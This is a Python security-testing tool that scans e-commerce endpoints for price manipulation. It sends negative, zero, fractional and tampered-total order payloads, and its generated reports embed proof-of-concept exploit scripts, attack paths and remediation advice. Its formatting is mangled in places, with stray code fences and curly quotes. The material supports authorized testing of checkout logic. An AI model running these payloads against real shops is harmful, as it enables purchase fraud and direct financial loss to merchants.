#!/usr/bin/env python3
"""
REVUEX - Price Manipulation Scanner
E-commerce Security Testing & Price Tampering Detection

Author: G33L0
Telegram: @x0x0h33l0

DISCLAIMER:
This tool is for educational purposes and authorized security testing only.
Use extreme caution - price manipulation testing can affect real transactions.
“””

import requests
import json
import time
from pathlib import Path
import re
from decimal import Decimal

class PriceManipulationScanner:
“”“E-commerce price manipulation vulnerability scanner”””

```
def __init__(self, endpoint, workspace, delay=3):
    """
    Initialize Price Manipulation Scanner
    
    Args:
        endpoint: Target e-commerce endpoint
        workspace: Workspace directory
        delay: Extra safety delay between tests
    """
    self.endpoint = endpoint
    self.workspace = Path(workspace)
    self.delay = delay
    
    self.headers = {
        'User-Agent': 'REVUEX-PriceScanner/1.0 (Security Research; +https://github.com/G33L0)',
        'Content-Type': 'application/json'
    }
    
    # Test payloads for price manipulation
    self.test_cases = {
        'negative_price': {
            'description': 'Negative price values',
            'payloads': [-1, -0.01, -100, -999.99]
        },
        'zero_price': {
            'description': 'Zero price values',
            'payloads': [0, 0.00, 0.0]
        },
        'decimal_precision': {
            'description': 'Decimal precision abuse',
            'payloads': [0.001, 0.0001, 0.00001, 1.999999]
        },
        'large_discount': {
            'description': 'Excessive discount percentages',
            'payloads': [100, 101, 150, 200, 999, -50]
        },
        'currency_manipulation': {
            'description': 'Currency code manipulation',
            'payloads': ['USD', 'EUR', 'GBP', 'XXX', '', 'null']
        },
        'quantity_overflow': {
            'description': 'Quantity overflow/underflow',
            'payloads': [-1, 0, 999999, 2147483647, -2147483648]
        },
        'bundle_price': {
            'description': 'Bundle price manipulation',
            'payloads': [
                {'item1': 100, 'item2': 50, 'bundle_total': 10},
                {'items': 3, 'price_per_item': 100, 'total': 1}
            ]
        }
    }

def test(self):
    """Test for price manipulation vulnerabilities"""
    print(f"            [!] CAUTION: Testing price manipulation on {self.endpoint}")
    print(f"            [!] Using {self.delay}s safety delay")
    
    vulnerabilities = []
    
    # Test 1: Negative prices
    print(f"            → Test 1: Negative price values")
    negative_result = self._test_negative_prices()
    if negative_result.get('vulnerable'):
        vuln = self._create_negative_price_vulnerability(negative_result)
        vulnerabilities.append(vuln)
    
    time.sleep(self.delay)
    
    # Test 2: Zero prices
    print(f"            → Test 2: Zero price values")
    zero_result = self._test_zero_prices()
    if zero_result.get('vulnerable'):
        vuln = self._create_zero_price_vulnerability(zero_result)
        vulnerabilities.append(vuln)
    
    time.sleep(self.delay)
    
    # Test 3: Decimal precision
    print(f"            → Test 3: Decimal precision abuse")
    decimal_result = self._test_decimal_precision()
    if decimal_result.get('vulnerable'):
        vuln = self._create_decimal_vulnerability(decimal_result)
        vulnerabilities.append(vuln)
    
    time.sleep(self.delay)
    
    # Test 4: Parameter tampering
    print(f"            → Test 4: Parameter tampering")
    tampering_result = self._test_parameter_tampering()
    if tampering_result.get('vulnerable'):
        vuln = self._create_tampering_vulnerability(tampering_result)
        vulnerabilities.append(vuln)
    
    time.sleep(self.delay)
    
    # Test 5: Currency manipulation
    print(f"            → Test 5: Currency manipulation")
    currency_result = self._test_currency_manipulation()
    if currency_result.get('vulnerable'):
        vuln = self._create_currency_vulnerability(currency_result)
        vulnerabilities.append(vuln)
    
    # Save results
    self._save_results(vulnerabilities)
    
    return vulnerabilities

def _create_negative_price_vulnerability(self, result):
    """Create enhanced negative price vulnerability report"""
    sample_test = result['tests'][0] if result['tests'] else {}
    
    return {
        'type': 'Price Manipulation - Negative Prices',
        'severity': 'critical',
        'endpoint': self.endpoint,
        'description': 'E-commerce endpoint accepts negative price values, allowing attackers to receive money instead of paying for products',
        'evidence': f'Negative price accepted: {result.get("evidence")}',
        
        # NEW: Steps to Reproduce
        'steps_to_reproduce': [
            f"Navigate to e-commerce checkout at {self.endpoint}",
            "Add product to cart (e.g., $100 item)",
            "Open browser Developer Tools (F12) → Network tab",
            "Proceed to checkout and intercept the request",
            "Modify price parameter to negative value (e.g., -100)",
            "Submit the modified request",
            "Observe: Order confirmed with negative total",
            "Result: Customer receives $100 instead of paying $100"
        ],
        
        # NEW: HTTP Request/Response
        'request': f"""POST {self.endpoint} HTTP/1.1
```

Host: {self._extract_host(self.endpoint)}
Content-Type: application/json
Cookie: session=valid_session_token

{{
“item_id”: “PROD-001”,
“product_name”: “Premium Widget”,
“original_price”: 100.00,
“price”: -100.00,
“quantity”: 1,
“total”: -100.00
}}”””,

```
        'response': """HTTP/1.1 200 OK
```

Content-Type: application/json

{
“order_id”: “ORD-12345”,
“status”: “confirmed”,
“items”: [
{
“product”: “Premium Widget”,
“price”: -100.00,
“quantity”: 1
}
],
“total”: -100.00,
“payment_method”: “credit_card”,
“message”: “Order confirmed! You will receive $100.00”
}”””,

```
        # NEW: Proof of Concept
        'poc': f"""#!/usr/bin/env python3
```

# Price Manipulation - Negative Price PoC

import requests
import json

endpoint = “{self.endpoint}”

# Legitimate product

product = {{
“item_id”: “PROD-001”,
“product_name”: “Premium Widget”,
“original_price”: 100.00,
“price”: -100.00,  # MANIPULATED: Negative price
“quantity”: 1,
“total”: -100.00   # Customer gets paid instead of paying
}}

# Submit order with negative price

response = requests.post(
endpoint,
json=product,
headers={{‘Content-Type’: ‘application/json’}}
)

print(f”Status: {{response.status_code}}”)
result = response.json()

if response.status_code == 200:
print(“🚨 CRITICAL: Negative price accepted!”)
print(f”Order ID: {{result.get(‘order_id’)}}”)
print(f”Total: ${{result.get(‘total’)}}”)
print(f”Customer receives: ${{abs(result.get(‘total’))}}”)

```
# Financial impact calculation
print("\\n=== Financial Impact ===")
print(f"If attacker orders 100 items:")
print(f"Total loss: ${{abs(result.get('total')) * 100}}")
```

else:
print(“✓ Protected: Negative price rejected”)

# Test multiple negative values

print(”\n=== Testing Multiple Values ===”)
for price in [-0.01, -1, -100, -999.99]:
test = product.copy()
test[‘price’] = price
test[‘total’] = price

```
r = requests.post(endpoint, json=test)
print(f"Price ${{price}}: {{r.status_code}} - {{'Accepted' if r.status_code == 200 else 'Rejected'}}")
```

“””,

```
        # NEW: Before/After
        'before_state': 'Customer pays $100.00 for product',
        'after_state': 'Customer receives $100.00 refund for "purchasing" product - Direct financial loss',
        
        'attack_path': [
            'Attacker adds expensive product to cart ($1000 item)',
            'Intercepts checkout request using proxy (Burp Suite)',
            'Modifies price from 1000.00 to -1000.00',
            'Submits modified request to server',
            'Server accepts negative price without validation',
            'Order confirmed with negative total',
            'Company pays attacker $1000 instead of receiving payment',
            'Attacker repeats to drain company funds'
        ],
        'remediation': [
            'CRITICAL: Implement server-side price validation',
            'NEVER trust client-supplied price data',
            'Reject all negative price values at API level',
            'Store authoritative prices in database only',
            'Recalculate all totals server-side before payment',
            'Add validation: if (price <= 0) reject_request()',
            'Implement min/max price range validation per product',
            'Add cryptographic signatures to cart data',
            'Log all price-related transactions for fraud detection',
            'Implement anomaly detection for unusual pricing',
            'Add manual review queue for suspicious orders',
            'Use decimal data types (not float) for currency',
            'Immediately audit and cancel all negative-price orders'
        ],
        'tags': ['ecommerce', 'payment', 'critical', 'price_manipulation', 'financial_loss']
    }

def _create_zero_price_vulnerability(self, result):
    """Create zero price vulnerability report"""
    return {
        'type': 'Price Manipulation - Zero Price',
        'severity': 'critical',
        'endpoint': self.endpoint,
        'description': 'Endpoint accepts zero-price orders, allowing free product acquisition',
        'evidence': f'Zero price accepted: {result.get("evidence")}',
        
        'steps_to_reproduce': [
            "Add product to cart",
            "Intercept checkout request",
            "Set price to 0.00",
            "Submit request",
            "Receive free product"
        ],
        
        'request': f"""POST {self.endpoint} HTTP/1.1
```

Content-Type: application/json

{{
“item_id”: “PROD-001”,
“price”: 0.00,
“quantity”: 1,
“total”: 0.00
}}”””,

```
        'response': """HTTP/1.1 200 OK
```

{
“order_id”: “ORD-67890”,
“total”: 0.00,
“status”: “confirmed”
}”””,

```
        'poc': f"""#!/usr/bin/env python3
```

# Zero Price Exploitation

import requests

response = requests.post(
“{self.endpoint}”,
json={{
“item_id”: “EXPENSIVE_ITEM”,
“price”: 0.00,  # Free!
“quantity”: 100
}}
)

if response.status_code == 200:
print(“SUCCESS: Free products ordered!”)
print(response.json())
“””,

```
        'before_state': 'Product costs $500',
        'after_state': 'Product acquired for $0 - Complete financial loss',
        
        'attack_path': [
            'Set price to zero',
            'Order confirmed',
            'Free product delivered',
            'Company loses inventory value'
        ],
        'remediation': [
            'Reject zero prices for non-free items',
            'Validate price > 0',
            'Server-side price lookup',
            'Implement minimum price rules'
        ],
        'tags': ['ecommerce', 'critical', 'price_manipulation']
    }

def _create_decimal_vulnerability(self, result):
    """Create decimal precision vulnerability report"""
    return {
        'type': 'Price Manipulation - Decimal Precision',
        'severity': 'high',
        'endpoint': self.endpoint,
        'description': 'Endpoint accepts fractional cent prices causing rounding errors',
        'evidence': f'Tiny prices accepted: {result.get("evidence")}',
        
        'steps_to_reproduce': [
            "Set item price to 0.001 (1/10th of a cent)",
            "Set quantity to 1000",
            "Expected: $1.00 total",
            "If rounded down: $0.00 total",
            "Get 1000 items for free"
        ],
        
        'poc': f"""#!/usr/bin/env python3
```

# Decimal Precision Attack

# Order 1000 items at $0.001 each

response = requests.post(
“{self.endpoint}”,
json={{
“price”: 0.001,
“quantity”: 1000,
“total”: 1.00  # Or rounds to 0
}}
)
“””,

```
        'before_state': '1000 items × $1.00 = $1000',
        'after_state': '1000 items × $0.001 = $1.00 (or $0 if rounded)',
        
        'remediation': [
            'Enforce minimum price of $0.01',
            'Reject sub-cent pricing',
            'Use proper decimal types',
            'Validate precision limits'
        ],
        'tags': ['ecommerce', 'price_manipulation', 'rounding']
    }

def _create_tampering_vulnerability(self, result):
    """Create parameter tampering vulnerability report"""
    sample = result['tests'][0] if result['tests'] else {}
    
    return {
        'type': 'Price Manipulation - Parameter Tampering',
        'severity': 'critical',
        'endpoint': self.endpoint,
        'description': 'Server trusts client-supplied total instead of calculating server-side',
        'evidence': f'Tampering accepted: {result.get("evidence")}',
        
        'steps_to_reproduce': [
            "Add $100 item with quantity 10",
            "Expected total: $1000",
            "Intercept request",
            "Modify total to $1",
            "Server accepts $1 total",
            "Pay $1 for $1000 worth of goods"
        ],
        
        'request': f"""POST {self.endpoint} HTTP/1.1
```

Content-Type: application/json

{{
“item_price”: 100.00,
“quantity”: 10,
“total”: 1.00
}}”””,

```
        'response': """HTTP/1.1 200 OK
```

{
“order_confirmed”: true,
“amount_charged”: 1.00
}”””,

```
        'poc': f"""#!/usr/bin/env python3
```

# Parameter Tampering PoC

import requests

# $100 × 10 items = $1000

# But send total: $1

payload = {{
“item_id”: “LAPTOP-2024”,
“unit_price”: 1000.00,
“quantity”: 10,
“total”: 1.00  # Should be $10,000!
}}

response = requests.post(”{self.endpoint}”, json=payload)

if response.status_code == 200:
print(“VULNERABLE: Paid $1 for $10,000 worth of items!”)
“””,

```
        'before_state': '10 laptops × $1000 = $10,000 total',
        'after_state': 'Server accepts client-supplied total of $1',
        
        'attack_path': [
            'Modify total field',
            'Server trusts client calculation',
            'Massive discount achieved',
            'Severe financial loss'
        ],
        'remediation': [
            'NEVER trust client-supplied totals',
            'Always recalculate: price × quantity',
            'Reject requests with mismatched calculations',
            'Validate: (unit_price × quantity) == total',
            'Server-side calculation is authoritative'
        ],
        'tags': ['ecommerce', 'critical', 'tampering']
    }

def _create_currency_vulnerability(self, result):
    """Create currency manipulation vulnerability report"""
    return {
        'type': 'Currency Manipulation',
        'severity': 'medium',
        'endpoint': self.endpoint,
        'description': 'Invalid currency codes accepted',
        'evidence': f'Currency manipulation: {result.get("evidence")}',
        
        'remediation': [
            'Whitelist valid currency codes',
            'Validate against ISO 4217',
            'Reject invalid currencies'
        ],
        'tags': ['ecommerce', 'currency']
    }

def _test_negative_prices(self):
    """Test negative price values"""
    results = {
        'vulnerable': False,
        'method': 'negative_prices',
        'tests': []
    }
    
    for price in self.test_cases['negative_price']['payloads']:
        try:
            payload = {
                'price': price,
                'amount': price,
                'total': price,
                'item_id': 'test_item',
                'quantity': 1
            }
            
            response = requests.post(
                self.endpoint,
                headers=self.headers,
                json=payload,
                timeout=10,
                verify=False
            )
            
            accepted = response.status_code in [200, 201, 202]
            
            test_result = {
                'price': price,
                'status_code': response.status_code,
                'accepted': accepted,
                'response_preview': response.text[:200]
            }
            
            results['tests'].append(test_result)
            
            if accepted:
                results['vulnerable'] = True
                results['evidence'] = f'Negative price {price} was accepted'
            
            time.sleep(0.5)
            
        except Exception as e:
            results['tests'].append({
                'price': price,
                'error': str(e)
            })
    
    return results

def _test_zero_prices(self):
    """Test zero price values"""
    results = {
        'vulnerable': False,
        'method': 'zero_prices',
        'tests': []
    }
    
    for price in self.test_cases['zero_price']['payloads']:
        try:
            payload = {
                'price': price,
                'total': price,
                'item_id': 'test_item',
                'quantity': 1
            }
            
            response = requests.post(
                self.endpoint,
                headers=self.headers,
                json=payload,
                timeout=10,
                verify=False
            )
            
            accepted = response.status_code in [200, 201, 202]
            
            test_result = {
                'price': price,
                'status_code': response.status_code,
                'accepted': accepted
            }
            
            results['tests'].append(test_result)
            
            if accepted:
                results['vulnerable'] = True
                results['evidence'] = f'Zero price {price} was accepted'
            
            time.sleep(0.5)
            
        except Exception as e:
            results['tests'].append({
                'price': price,
                'error': str(e)
            })
    
    return results

def _test_decimal_precision(self):
    """Test decimal precision abuse"""
    results = {
        'vulnerable': False,
        'method': 'decimal_precision',
        'tests': []
    }
    
    for price in self.test_cases['decimal_precision']['payloads']:
        try:
            payload = {
                'price': price,
                'amount': price,
                'item_id': 'test_item',
                'quantity': 1000
            }
            
            response = requests.post(
                self.endpoint,
                headers=self.headers,
                json=payload,
                timeout=10,
                verify=False
            )
            
            accepted = response.status_code in [200, 201, 202]
            
            test_result = {
                'price': price,
                'quantity': 1000,
                'expected_total': price * 1000,
                'status_code': response.status_code,
                'accepted': accepted
            }
            
            results['tests'].append(test_result)
            
            if accepted and price < 0.01:
                results['vulnerable'] = True
                results['evidence'] = f'Tiny price {price} accepted'
            
            time.sleep(0.5)
            
        except Exception as e:
            results['tests'].append({
                'price': price,
                'error': str(e)
            })
    
    return results

def _test_parameter_tampering(self):
    """Test parameter tampering"""
    results = {
        'vulnerable': False,
        'method': 'parameter_tampering',
        'tests': []
    }
    
    tampering_tests = [
        {
            'name': 'Conflicting prices',
            'payload': {
                'price': 1.00,
                'unit_price': 1.00,
                'total': 0.01,
                'quantity': 1
            }
        },
        {
            'name': 'Quantity-price mismatch',
            'payload': {
                'item_price': 50,
                'quantity': 10,
                'total': 1
            }
        }
    ]
    
    for test in tampering_tests:
        try:
            response = requests.post(
                self.endpoint,
                headers=self.headers,
                json=test['payload'],
                timeout=10,
                verify=False
            )
            
            accepted = response.status_code in [200, 201, 202]
            
            test_result = {
                'test_name': test['name'],
                'payload': test['payload'],
                'status_code': response.status_code,
                'accepted': accepted
            }
            
            results['tests'].append(test_result)
            
            if accepted:
                results['vulnerable'] = True
                results['evidence'] = f'{test["name"]}: Conflicting parameters accepted'
            
            time.sleep(1)
            
        except Exception as e:
            results['tests'].append({
                'test_name': test['name'],
                'error': str(e)
            })
    
    return results

def _test_currency_manipulation(self):
    """Test currency manipulation"""
    results = {
        'vulnerable': False,
        'method': 'currency_manipulation',
        'tests': []
    }
    
    for currency in self.test_cases['currency_manipulation']['payloads']:
        try:
            payload = {
                'price': 100,
                'currency': currency,
                'item_id': 'test_item'
            }
            
            response = requests.post(
                self.endpoint,
                headers=self.headers,
                json=payload,
                timeout=10,
                verify=False
            )
            
            accepted = response.status_code in [200, 201, 202]
            
            test_result = {
                'currency': currency,
                'status_code': response.status_code,
                'accepted': accepted
            }
            
            results['tests'].append(test_result)
            
            if accepted and currency in ['XXX', '', 'null']:
                results['vulnerable'] = True
                results['evidence'] = f'Invalid currency "{currency}" accepted'
            
            time.sleep(0.5)
            
        except Exception as e:
            results['tests'].append({
                'currency': currency,
                'error': str(e)
            })
    
    return results

def _extract_host(self, url):
    """Extract hostname from URL"""
    from urllib.parse import urlparse
    parsed = urlparse(url)
    return parsed.netloc or url

def _save_results(self, vulnerabilities):
    """Save results"""
    price_dir = self.workspace / "price_manipulation_tests"
    price_dir.mkdir(exist_ok=True)
    
    safe_name = re.sub(r'[^\w\-]', '_', self.endpoint)
    output_file = price_dir / f"{safe_name}_price_test.json"
    
    with open(output_file, 'w') as f:
        json.dump({
            'endpoint': self.endpoint,
            'vulnerabilities': vulnerabilities
        }, f, indent=2)
```